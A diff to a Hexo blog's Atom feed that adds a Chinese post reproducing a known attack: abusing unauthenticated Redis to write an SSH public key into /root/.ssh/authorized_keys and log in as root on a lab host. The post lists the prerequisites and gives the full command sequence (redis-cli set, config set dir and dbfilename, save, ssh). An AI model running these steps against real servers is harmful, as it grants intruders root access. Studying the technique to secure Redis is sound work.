@@ -6,7 +6,7 @@
   <link href="/liuzhong3639.github.io/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-07-27T08:38:55.199Z</updated>
+  <updated>2020-07-30T05:15:19.445Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Redis写公钥拿服务器</title>
+    <link href="http://yoursite.com/2020/07/30/Redis%E5%86%99%E5%85%AC%E9%92%A5%E6%8B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8%20/"/>
+    <id>http://yoursite.com/2020/07/30/Redis%E5%86%99%E5%85%AC%E9%92%A5%E6%8B%BF%E6%9C%8D%E5%8A%A1%E5%99%A8%20/</id>
+    <published>2020-07-30T05:10:40.876Z</published>
+    <updated>2020-07-30T05:15:19.445Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\liuzhong3639.github.io\assets\css\APlayer.min.css"><script src="\liuzhong3639.github.io\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>redis未授权访问，在公网存在很多这样的漏洞，这种漏洞某种情况下可进行写入ssh公钥，使得攻击者不用任何密码即可登陆服务器。接下来，我们来研究复现一下此漏洞吧</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-1.png" alt="img"></p><h4 id="环境要求："><a href="#环境要求：" class="headerlink" title="环境要求："></a>环境要求：</h4><p>redis其他地址可访问</p><p>redis关闭保护模式</p><p>被攻击服务器开启ssh密钥登陆</p><p>root权限运行redis</p><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><p>1-攻击机设置ssh无密码登陆<br>ssh-keygen -t rsa<br>回车</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image.png" alt="img"></p><p>2-回到/root/.ssh目录<br>执行如下命令<br>(echo -e “\n\n”;cat id_rsa.pub;echo -e “\n\n”)&gt;1.txt<br>cat 1.txt |redis-cli -h 192.168.147.133 -x set crack</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-2-1024x179.png" alt="img"></p><p>3-连接redis<br>config get dir<br>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>config get dbfilename<br>save<br>exit</p><p>4-ssh密钥连接<br>ssh -i id_rsa <a href="mailto:root@192.168.147.133">root@192.168.147.133</a></p><p>连接成功，成功拿下服务器，是不是特别简单</p><p><img src= "/liuzhong3639.github.io/img/loading.gif" data-src="http://sec.hqjs.xyz/wp-content/uploads/2019/10/image-3-1024x505.png" alt="img"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\liuzhong3639.github.io\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\liuzho
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Hello World</title>
